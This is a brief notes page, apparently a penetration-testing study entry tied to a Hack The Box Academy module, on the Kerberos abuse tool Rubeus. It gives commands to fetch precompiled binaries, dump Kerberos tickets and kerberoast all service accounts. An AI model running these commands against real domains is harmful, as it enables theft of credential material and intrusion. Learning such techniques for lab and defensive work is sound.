rubeus
###########

Date: 2024-11-25 19:35

Status:

Description
***********

Rubeus is a C# tool built for Kerberos Abuse.

Installation 
****************

.. code-block:: bash

   git clone https://github.com/szalek/Ghostpack-CompiledBinaries.git 

Dumping tickets
********************

Example 1:

.. code-block:: console

   Rubeus.exe dump /nowrap

Must run as local administrator 

Example 2: Kerberoast all SPN accounts 

.. code-block:: powershell

   ./Rubeus.exe kerberoast /nowrap

   
References
*************
https://academy.hackthebox.com/module/147/section/1639s
